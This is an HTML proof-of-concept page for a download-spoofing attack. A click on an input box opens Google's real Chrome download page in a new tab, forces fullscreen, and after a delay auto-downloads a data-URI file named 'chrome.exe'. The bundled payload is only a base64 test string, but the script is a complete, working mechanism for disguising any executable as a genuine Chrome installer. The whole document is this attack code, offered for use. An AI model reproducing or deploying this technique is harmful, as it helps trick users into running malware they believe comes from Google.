
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download & Fullscreen on Keypress</title>
</head>
<body>
  <center><h2>POC by 0x403for!</h2></center>
  <input type="text" id="triggerInput">
  <script>
    document.getElementById('triggerInput').addEventListener('click', function() {
      
 setTimeout(function() {
        openWin();
 }, 2000);
 window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', '_blank');
      goFullScreen();
    }, { once: false }); 
    
    function Puf(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
    function openWin() {
      Puf(
        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
        "chrome.exe"
      );
    }
    function goFullScreen() {
      const element = document.documentElement;
      if (element.requestFullscreen) {
        element.requestFullscreen();
      } else if (element.mozRequestFullScreen) { 
        element.mozRequestFullScreen();
      } else if (element.webkitRequestFullscreen) { 
        element.webkitRequestFullscreen();
      } else if (element.msRequestFullscreen) { 
        element.msRequestFullscreen();

      }

    }

  </script>  

  
</body>
</html>
